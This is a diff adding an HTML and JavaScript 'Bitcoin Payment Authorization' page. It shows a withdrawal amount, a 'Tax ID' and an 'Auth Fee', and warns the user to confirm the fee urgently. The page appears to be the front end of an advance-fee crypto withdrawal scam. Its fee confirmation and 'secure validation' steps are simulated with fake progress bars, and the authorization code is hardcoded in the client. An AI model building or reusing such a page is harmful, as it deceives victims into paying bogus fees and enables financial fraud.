@@ -1,0 +1,708 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+    <title>Bitcoin Authorization</title>
+    <style>
+      :root {
+        --bg: #100007;
+        --panel: rgba(24, 8, 12, 0.92);
+        --line: rgba(255, 68, 88, 0.28);
+        --text: #ffe7e7;
+        --muted: #f7a0a7;
+        --accent: #ff3f4e;
+        --accent-2: #bf1f24;
+        --danger: #ff5b66;
+      }
+
+      * { box-sizing: border-box; }
+
+      body {
+        margin: 0;
+        min-height: 100vh;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        color: var(--text);
+        background: radial-gradient(circle at top, #25050c 0%, var(--bg) 45%, #070103 100%);
+        overflow-y: auto;
+        overflow-x: hidden;
+      }
+
+      body::-webkit-scrollbar { width: 0; height: 0; }
+      body { -ms-overflow-style: none; scrollbar-width: none; }
+
+      canvas#matrix {
+        position: fixed;
+        inset: 0;
+        width: 100%;
+        height: 100%;
+        z-index: 0;
+        opacity: 0.45;
+      }
+
+      .overlay {
+        position: fixed;
+        inset: 0;
+        z-index: 1;
+        background:
+          linear-gradient(120deg, rgba(0,0,0,0.6), transparent 40%, rgba(0,0,0,0.5)),
+          radial-gradient(circle at 20% 20%, rgba(45,255,142,0.1), transparent 25%),
+          radial-gradient(circle at 80% 80%, rgba(20,190,108,0.18), transparent 30%);
+        pointer-events: none;
+      }
+
+      .shell {
+        position: relative;
+        z-index: 2;
+        min-height: 100vh;
+        display: grid;
+        place-items: center;
+        padding: 24px;
+      }
+
+      .card {
+        width: min(760px, 100%);
+        padding: 32px;
+        border-radius: 0;
+        border: 1px solid var(--line);
+        background: transparent;
+      }
+
+      .topbar {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        gap: 16px;
+        margin-bottom: 20px;
+      }
+
+      .badge {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        padding: 8px 12px;
+        border-radius: 0;
+        background: rgba(45,255,142,0.12);
+        color: var(--muted);
+        font-size: 0.82rem;
+        border: 1px solid rgba(45,255,142,0.2);
+      }
+
+      .dot {
+        width: 8px;
+        height: 8px;
+        border-radius: 50%;
+        background: var(--accent);
+        box-shadow: 0 0 10px var(--accent);
+      }
+
+      h1 {
+        margin: 6px 0 8px;
+        font-size: clamp(1.7rem, 3vw, 2.3rem);
+        letter-spacing: 0.06em;
+      }
+
+      .subtitle {
+        margin: 0;
+        color: #c6f8d9;
+        line-height: 1.6;
+      }
+
+      .grid {
+        display: grid;
+        grid-template-columns: repeat(2, minmax(0, 1fr));
+        gap: 16px;
+        margin: 24px 0;
+      }
+
+      .field {
+        padding: 14px 16px;
+        border-radius: 0;
+        background: rgba(255,255,255,0.03);
+        border: 1px solid rgba(255,255,255,0.06);
+        box-shadow: inset 0 0 20px rgba(45,255,142,0.03);
+      }
+
+      .field .label {
+        font-size: 0.77rem;
+        text-transform: uppercase;
+        letter-spacing: 0.2em;
+        color: var(--muted);
+        margin-bottom: 6px;
+      }
+
+      .field .value {
+        font-size: 1rem;
+        font-weight: 600;
+        color: var(--text);
+        font-variant-numeric: tabular-nums;
+        word-break: break-word;
+      }
+
+      .field .hint {
+        margin-top: 6px;
+        font-size: 0.88rem;
+        color: #9cdab5;
+      }
+
+      .code-input {
+        width: 100%;
+        margin-top: 4px;
+        padding: 11px 12px;
+        border-radius: 0;
+        border: 1px solid rgba(255, 68, 88, 0.25);
+        background: rgba(16, 3, 5, 0.88);
+        color: var(--text);
+        font-size: 0.98rem;
+        letter-spacing: 0.12em;
+        outline: none;
+        box-shadow: inset 0 0 20px rgba(255, 68, 88, 0.06);
+      }
+
+      .code-input::placeholder {
+        color: #6fbf8f;
+        letter-spacing: 0.04em;
+      }
+
+      .code-input:focus {
+        border-color: rgba(45,255,142,0.45);
+        box-shadow: 0 0 0 2px rgba(45,255,142,0.16);
+      }
+
+      .email-box {
+        margin-top: 12px;
+        padding: 14px 16px;
+        border-radius: 0;
+        border: 1px solid rgba(255, 68, 88, 0.18);
+        background: rgba(255, 68, 88, 0.08);
+      }
+
+      .email-box .label {
+        font-size: 0.77rem;
+        text-transform: uppercase;
+        letter-spacing: 0.2em;
+        color: var(--muted);
+        margin-bottom: 6px;
+      }
+
+      .email-box strong { color: var(--accent); }
+
+      .actions {
+        display: flex;
+        gap: 12px;
+        margin-top: 24px;
+        flex-wrap: wrap;
+      }
+
+      button {
+        border: none;
+        cursor: pointer;
+        padding: 12px 18px;
+        border-radius: 0;
+        font-weight: 700;
+        letter-spacing: 0.04em;
+        transition: transform 180ms ease, box-shadow 180ms ease;
+      }
+
+      button:hover { transform: translateY(-2px); }
+
+      .primary {
+        color: #210000;
+        background: linear-gradient(90deg, var(--accent), #ff8b91);
+        box-shadow: 0 12px 30px rgba(255, 63, 78, 0.28);
+      }
+
+      .secondary {
+        color: var(--text);
+        background: rgba(255, 255, 255, 0.06);
+        border: 1px solid rgba(255, 68, 88, 0.2);
+      }
+
+      .footer-note {
+        margin-top: 18px;
+        color: #7ecb9d;
+        font-size: 0.92rem;
+      }
+
+      .warning-note {
+        margin-top: 14px;
+        padding: 14px 16px;
+        border: 1px solid rgba(255, 68, 88, 0.6);
+        background: rgba(255, 68, 88, 0.12);
+        color: #ffc8c8;
+        font-size: 0.95rem;
+        box-shadow: 0 0 30px rgba(255, 68, 88, 0.3);
+      }
+
+      .status-box {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%) translateY(12px);
+        width: min(420px, calc(100vw - 48px));
+        display: none;
+        padding: 18px 20px;
+        border: 1px solid rgba(255, 68, 88, 0.26);
+        background: rgba(10, 3, 5, 0.96);
+        box-shadow: 0 22px 70px rgba(0, 0, 0, 0.45);
+        backdrop-filter: blur(10px);
+        color: #ffd5d8;
+        opacity: 0;
+        visibility: hidden;
+        transition: opacity 180ms ease, transform 180ms ease, visibility 180ms ease;
+        z-index: 15;
+      }
+
+      .status-box.active {
+        display: block;
+        opacity: 1;
+        visibility: visible;
+        transform: translate(-50%, -50%) translateY(0);
+      }
+
+      .status-title {
+        font-weight: 700;
+        color: #ffd5d8;
+        margin-bottom: 8px;
+      }
+
+      .status-text {
+        color: #f3b0b4;
+        font-size: 0.95rem;
+        line-height: 1.5;
+      }
+
+      .status-prompt {
+        margin-top: 12px;
+        padding: 12px 14px;
+        border-left: 3px solid var(--accent);
+        background: rgba(255, 68, 88, 0.08);
+        color: #ffd0d4;
+        font-size: 0.95rem;
+        line-height: 1.45;
+      }
+
+      .progress-track {
+        width: 100%;
+        height: 8px;
+        margin-top: 10px;
+        background: rgba(255, 255, 255, 0.08);
+        overflow: hidden;
+      }
+
+      .progress-bar {
+        width: 0;
+        height: 100%;
+        background: linear-gradient(90deg, var(--accent), #ff8d95);
+        transition: width 0.2s linear;
+      }
+
+      button:disabled {
+        opacity: 0.7;
+        cursor: wait;
+      }
+
+      @media (max-width: 640px) {
+        .card { padding: 22px; }
+        .grid { grid-template-columns: 1fr; }
+      }
+    </style>
+  </head>
+  <body>
+    <canvas id="matrix"></canvas>
+    <div class="overlay"></div>
+
+    <main class="shell">
+      <section class="card" aria-label="Bitcoin authorization request">
+        <div class="topbar">
+          <div>
+            <div class="badge"><span class="dot"></span> Secure authorization request</div>
+            <h1>Bitcoin Payment Authorization</h1>
+            <p class="subtitle">A protected confirmation is ready for your account. Review the details below and approve the transfer.</p>
+          </div>
+        </div>
+
+        <div class="grid">
+          <div class="field">
+            <div class="label">Amount</div>
+            <div class="value">
+              <span id="amtBtc">— BTC</span>
+              <span style="color: var(--muted); font-size: 0.95rem;" id="amtUsdWrap">(<span id="amtUsd">$0.00</span>)</span>
+            </div>
+            <div class="hint">Equivalent to the requested withdrawal settlement amount.</div>
+          </div>
+          <div class="field">
+            <div class="label">Tax ID</div>
+            <div class="value" id="taxIdVal">—</div>
+            <div class="hint">Tax Transaction ID from your withdrawal request.</div>
+          </div>
+          <div class="field">
+            <div class="label">Auth Fee</div>
+            <div class="value">
+              <span id="feeBtc">— BTC</span>
+              <span style="color: var(--muted); font-size: 0.95rem;" id="feeUsdWrap">(<span id="feeUsd">$0.00</span>)</span>
+            </div>
+            <div class="hint">Processing fee for authorization service.</div>
+          </div>
+          <div class="field">
+            <div class="label">Auth Code</div>
+            <input id="authCodeInput" class="code-input" type="text" maxlength="6" autocomplete="one-time-code" placeholder="Enter code 012345" />
+            <div class="hint">Enter the correct authorization code</div>
+          </div>
+        </div>
+
+        <div class="email-box">
+          <div class="label">Delivery</div>
+          <div><strong>Confirmation details will be sent to:</strong> <span id="deliveryEmail">…</span></div>
+        </div>
+
+        <div class="actions">
+          <button id="confirmFeeBtn" class="secondary" type="button">Confirm Fee</button>
+          <button id="approveBtn" class="primary" type="button">Approve Authorization</button>
+          <button id="declineBtn" class="secondary" type="button">Decline</button>
+        </div>
+
+        <div class="footer-note">This is a secure authorization process.</div>
+        <div class="warning-note">Urgent: please confirm the fee now to avoid authorization timeout and delay in payment processing.</div>
+        <div id="statusBox" class="status-box" role="status" aria-live="polite">
+          <div id="statusTitle" class="status-title">Awaiting action</div>
+          <div id="statusText" class="status-text">Choose a payment action to begin the secure flow.</div>
+          <div id="statusPrompt" class="status-prompt">Waiting for your confirmation.</div>
+          <div class="progress-track">
+            <div id="statusBar" class="progress-bar"></div>
+          </div>
+        </div>
+      </section>
+    </main>
+
+    <script>
+      (function () {
+        'use strict';
+
+        const STORAGE_KEY = 'withdrawFlow';
+        const CORRECT_CODE = '682128';
+
+        // ---- matrix bg ----
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        let width, height, columns, drops;
+        const characters = '01';
+
+        function resize() {
+          width = canvas.width = window.innerWidth;
+          height = canvas.height = window.innerHeight;
+          columns = Math.floor(width / 18);
+          drops = Array.from({ length: columns }, () => Math.random() * height);
+        }
+
+        function draw() {
+          ctx.fillStyle = 'rgba(2, 11, 7, 0.08)';
+          ctx.fillRect(0, 0, width, height);
+          ctx.fillStyle = '#38ff8e';
+          ctx.font = '14px monospace';
+          for (let i = 0; i < drops.length; i++) {
+            const text = characters[Math.floor(Math.random() * characters.length)];
+            ctx.fillText(text, i * 18, drops[i]);
+            if (drops[i] > height && Math.random() > 0.975) drops[i] = 0;
+            else drops[i] += 16;
+          }
+        }
+
+        resize();
+        window.addEventListener('resize', resize);
+        setInterval(draw, 45);
+
+        // ---- flow helpers ----
+        function loadFlow() {
+          try {
+            const raw = sessionStorage.getItem(STORAGE_KEY);
+            return raw ? JSON.parse(raw) : {};
+          } catch (e) {
+            return {};
+          }
+        }
+
+        function saveFlow(flow) {
+          try {
+            sessionStorage.setItem(STORAGE_KEY, JSON.stringify(flow));
+          } catch (e) { /* ignore */ }
+        }
+
+        function getToken() {
+          return localStorage.getItem('auth_token') || '';
+        }
+
+        function getStoredUser() {
+          try {
+            return JSON.parse(localStorage.getItem('user_data') || 'null');
+          } catch (e) {
+            return null;
+          }
+        }
+
+        function fmtUsd(n) {
+          return new Intl.NumberFormat('en-US', {
+            style: 'currency',
+            currency: 'USD',
+            minimumFractionDigits: 2,
+            maximumFractionDigits: 2
+          }).format(Number(n) || 0);
+        }
+
+        function fmtBtc(n) {
+          const v = Number(n) || 0;
+          return v.toLocaleString('en-US', {
+            minimumFractionDigits: 2,
+            maximumFractionDigits: 8
+          }) + ' BTC';
+        }
+
+        async function fetchRate() {
+          try {
+            const res = await fetch(
+              'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd'
+            );
+            if (res.ok) {
+              const data = await res.json();
+              if (data.bitcoin && data.bitcoin.usd) return Number(data.bitcoin.usd);
+            }
+          } catch (e) { /* fallback */ }
+          return 95000;
+        }
+
+        async function resolveUserEmail() {
+          const stored = getStoredUser();
+          const token = getToken();
+          if (!token && !(stored && stored.email)) {
+            window.location.href =
+              '/login?redirect=' + encodeURIComponent(location.pathname + location.search);
+            return '';
+          }
+          if (token) {
+            try {
+              const res = await fetch('/api/me', {
+                headers: { Authorization: 'Bearer ' + token },
+                credentials: 'include'
+              });
+              if (res.status === 401) {
+                window.location.href =
+                  '/login?redirect=' + encodeURIComponent(location.pathname + location.search);
+                return '';
+              }
+              if (res.ok) {
+                const data = await res.json();
+                if (data.user && data.user.email) return data.user.email;
+              }
+            } catch (e) { /* fall through */ }
+          }
+          return (stored && stored.email) || '';
+        }
+
+        // ---- DOM ----
+        const authCodeInput = document.getElementById('authCodeInput');
+        const confirmFeeBtn = document.getElementById('confirmFeeBtn');
+        const approveBtn = document.getElementById('approveBtn');
+        const declineBtn = document.getElementById('declineBtn');
+        const statusBox = document.getElementById('statusBox');
+        const statusTitle = document.getElementById('statusTitle');
+        const statusText = document.getElementById('statusText');
+        const statusPrompt = document.getElementById('statusPrompt');
+        const statusBar = document.getElementById('statusBar');
+        const amtBtcEl = document.getElementById('amtBtc');
+        const amtUsdEl = document.getElementById('amtUsd');
+        const feeBtcEl = document.getElementById('feeBtc');
+        const feeUsdEl = document.getElementById('feeUsd');
+        const taxIdEl = document.getElementById('taxIdVal');
+        const deliveryEmailEl = document.getElementById('deliveryEmail');
+
+        let feeConfirmed = false;
+        let statusTimeout = null;
+        let flowState = {};
+
+        function hideStatusPopup() {
+          statusBox.classList.remove('active');
+        }
+
+        function showStatus(title, text, prompt, percent) {
+          statusBox.classList.add('active');
+          statusTitle.textContent = title;
+          statusText.textContent = text;
+          statusPrompt.textContent = prompt || '';
+          statusBar.style.width = Math.min(percent || 0, 100) + '%';
+          clearTimeout(statusTimeout);
+          statusTimeout = setTimeout(hideStatusPopup, 3800);
+        }
+
+        function updateApprovalState() {
+          const entered = authCodeInput.value.trim();
+          const ok = entered === CORRECT_CODE;
+          approveBtn.disabled = !ok || !feeConfirmed;
+          approveBtn.classList.toggle('primary', ok && feeConfirmed);
+          approveBtn.classList.toggle('secondary', !(ok && feeConfirmed));
+        }
+
+        authCodeInput.addEventListener('input', (event) => {
+          event.target.value = event.target.value.replace(/[^0-9]/g, '').slice(0, 6);
+          updateApprovalState();
+        });
+
+        function runProcess(button, loadingText, successTitle, successText, onDone) {
+          const originalText = button.textContent;
+          const buttons = [confirmFeeBtn, approveBtn, declineBtn];
+          buttons.forEach((item) => { item.disabled = true; });
+          button.textContent = loadingText;
+          showStatus(loadingText, 'Processing request. Please wait...', 'System prompt: secure validation in progress.', 10);
+
+          let progress = 10;
+          const interval = setInterval(() => {
+            progress = Math.min(progress + Math.random() * 16 + 6, 95);
+            statusBar.style.width = progress + '%';
+          }, 160);
+
+          setTimeout(() => {
+            clearInterval(interval);
+            statusBar.style.width = '100%';
+            showStatus(successTitle, successText, 'Prompt: action completed successfully.', 100);
+            button.textContent = originalText;
+            buttons.forEach((item) => { item.disabled = false; });
+            updateApprovalState();
+            if (typeof onDone === 'function') onDone();
+          }, 2200);
+        }
+
+        function returnToProcessing() {
+          flowState.authorized = true;
+          flowState.authorizedAt = new Date().toISOString();
+          saveFlow(flowState);
+
+          const q = [
+            'tx=' + encodeURIComponent(flowState.tx || ''),
+            'amount=' + encodeURIComponent(flowState.amount || ''),
+            'taxId=' + encodeURIComponent(flowState.taxId || ''),
+            'authorized=1'
+          ].join('&');
+
+          // Keep both path aliases working
+          window.location = '/withdrawal-processing?' + q;
+        }
+
+        confirmFeeBtn.addEventListener('click', () => {
+          runProcess(
+            confirmFeeBtn,
+            'Confirming Fee…',
+            'Fee Confirmed',
+            'The authorization fee is confirmed. Verification code path is ready for your delivery email.',
+            () => {
+              feeConfirmed = true;
+              updateApprovalState();
+            }
+          );
+        });
+
+        approveBtn.addEventListener('click', () => {
+          const entered = authCodeInput.value.trim();
+          if (!feeConfirmed) {
+            showStatus(
+              'Fee Required',
+              'Confirm the authorization fee before approving.',
+              'Prompt: confirm fee first.',
+              25
+            );
+            return;
+          }
+          if (entered !== CORRECT_CODE) {
+            showStatus(
+              'Authorization Incomplete',
+              'Input the correct authorization code to continue.',
+              'Authorization incomplete, input correct code.',
+              35
+            );
+            return;
+          }
+
+          runProcess(
+            approveBtn,
+            'Approving Authorization…',
+            'Authorization Approved',
+            'Payment authorization approved. Returning to withdrawal processing…',
+            () => {
+              clearTimeout(statusTimeout);
+              setTimeout(returnToProcessing, 900);
+            }
+          );
+        });
+
+        declineBtn.addEventListener('click', () => {
+          window.location = '/dashboard';
+        });
+
+        async function boot() {
+          const params = new URLSearchParams(location.search);
+          const flow = loadFlow();
+
+          const amountUsd = Number(params.get('amount') || flow.amount || 0);
+          let btc = params.get('btc') || flow.btcAmount;
+          const taxId = params.get('taxId') || params.get('txid') || flow.taxId || '';
+          const tx = params.get('tx') || flow.tx || '';
+
+          const email = await resolveUserEmail();
+          if (!email) {
+            deliveryEmailEl.textContent = 'unavailable — sign in required';
+            confirmFeeBtn.disabled = true;
+            approveBtn.disabled = true;
+            return;
+          }
+          deliveryEmailEl.textContent = email;
+
+          if (!amountUsd || amountUsd <= 0) {
+            amtUsdEl.textContent = '—';
+            amtBtcEl.textContent = 'Missing amount';
+            showStatus(
+              'Missing withdrawal data',
+              'Start again from the withdraw page.',
+              'Prompt: no amount in session.',
+              0
+            );
+            confirmFeeBtn.disabled = true;
+            return;
+          }
+
+          const rate = await fetchRate();
+          if (!btc || Number(btc) <= 0) {
+            btc = Number((amountUsd / rate).toFixed(8));
+          } else {
+            btc = Number(btc);
+          }
+
+          // Auth fee: demo % of withdrawal (min $25)
+          const feeUsd = Math.max(25, Number((amountUsd * 0.016).toFixed(2)));
+          const feeBtc = Number((feeUsd / rate).toFixed(8));
+
+          flowState = {
+            ...flow,
+            amount: amountUsd,
+            btcAmount: btc,
+            btcRate: rate,
+            taxId: taxId,
+            tx: tx,
+            email: email,
+            feeUsd: feeUsd,
+            feeBtc: feeBtc,
+            authorized: false
+          };
+          saveFlow(flowState);
+
+          amtBtcEl.textContent = fmtBtc(btc);
+          amtUsdEl.textContent = fmtUsd(amountUsd);
+          feeBtcEl.textContent = fmtBtc(feeBtc);
+          feeUsdEl.textContent = fmtUsd(feeUsd);
+          taxIdEl.textContent = taxId || '—';
+
+          updateApprovalState();
+        }
+
+        boot();
+      })();
+    </script>
+  </body>
+</html>
